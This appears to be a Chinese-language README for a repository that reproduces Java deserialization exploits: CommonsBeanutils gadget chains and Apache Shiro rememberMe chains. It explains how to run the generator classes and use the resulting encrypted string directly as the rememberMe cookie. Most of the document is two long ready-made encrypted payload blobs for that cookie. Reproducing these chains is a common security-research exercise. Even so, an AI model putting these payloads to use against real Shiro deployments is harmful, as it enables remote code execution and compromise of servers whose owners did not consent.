# Java
复现Java反序列化漏洞
CommonsBeanutils
CommonsBeanutilsShiro
CommonsCeanutilsShiro

执行POC_macker.CCShiro.Get_poc#main得到Shiro的CC链加密字符串,可直接作为Cookie - remenberMe 
执行POC_macker.CBShiro.Get_poc#main得到Shiro的CC链加密字符串,可直接作为Cookie - remenberMe 
执行POC_macker.CommonsBeanutils.Get_poc#main后生成存放无CC依赖的CB链序列化数据,生成文件地址为./poc.bin

记得先生成Maven项目加载pom.xml文件中的依赖
CommonsBeanutilsShiro
```
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


```CommonsCeanutilsShiro
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
